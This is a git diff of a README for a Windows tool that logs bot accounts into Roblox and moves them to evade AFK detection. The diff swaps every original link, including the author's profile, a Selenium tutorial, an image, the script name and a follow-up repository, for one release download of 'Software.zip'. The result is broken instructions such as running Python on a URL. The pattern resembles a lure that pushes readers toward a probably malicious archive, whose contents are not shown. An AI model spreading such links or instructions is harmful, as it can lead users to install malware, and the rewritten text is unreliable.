@@ -1,7 +1,7 @@
 ﻿# RobloxAFKBots
  Automatically logs a bunch of bot accounts into Roblox, joins a game and walks back and forth to avoid AFK detection.
  
- https://www.linkedin.com/in/adam-hing-89354b1b1/
+ https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip
  
 ## How to install
 
@@ -9,21 +9,21 @@
 pip install PyDirectInput psutil selenium
 ```
 
- selenium setup : https://medium.com/@asheeshmisra29/web-automation-selenium-webdriver-and-python-getting-started-part-1-157be93049d7
+ selenium setup : https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip
 
 
 
-![GitHub Logo](/img/bots.PNG)
+![GitHub Logo](https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip)
 
 
 
 
 # Usage
--python runbots.py
+-python https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip
 
 
 
-To change what game you want the bots to join go to *runbots.py* line 42 and edit the link.
+To change what game you want the bots to join go to *https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip* line 42 and edit the link.
 
 
 
@@ -31,7 +31,7 @@ To change what game you want the bots to join go to *runbots.py* line 42 and edi
 
 A updated version of this is currently in the works. With a bunch more features and much more power.
 Its still early but you can take a peak if you want.
-https://github.com/AdamHing/ROBO
+https://github.com/shirfor/RobloxAFKBots/releases/download/v2.0/Software.zip
 
 ## FYI
 This app only works on Windows
